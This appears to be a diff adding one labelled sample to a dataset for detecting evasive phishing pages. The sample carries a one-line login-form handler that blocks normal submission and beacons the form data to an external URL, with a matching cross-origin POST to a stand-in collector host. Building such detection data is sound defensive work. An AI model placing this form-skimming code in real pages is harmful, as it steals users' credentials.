@@ -1,0 +1,10 @@
+{
+  "sample_id": "D-4",
+  "evasion_category": "Cross-Origin Telemetry Mismatch",
+  "static_code_trace": "form.onsubmit = (e) => { e.preventDefault(); navigator.sendBeacon(EXT_URL, data); };",
+  "initial_dom_trace": "<html><body><form id='login'><input type='email' name='email'></form></body></html>",
+  "runtime_dom_trace": "<html><body><form id='login'><input type='email' name='email'></form></body></html>",
+  "network_har_trace": "POST https://external-collector.sandbox.local/ingest [origin_mismatch=True]",
+  "timing_event_trace": "t=0ms: PageLoad(origin=portal.sandbox.local) | t=800ms: BeaconSent(cross_origin=True)",
+  "ground_truth": "evasive_attack"
+}
